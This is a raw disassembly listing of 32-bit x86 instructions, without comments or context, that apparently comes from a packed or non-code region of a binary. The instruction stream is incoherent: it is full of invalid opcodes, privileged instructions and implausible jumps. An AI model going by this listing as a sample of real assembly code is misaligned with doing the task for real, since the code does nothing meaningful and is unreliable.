  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
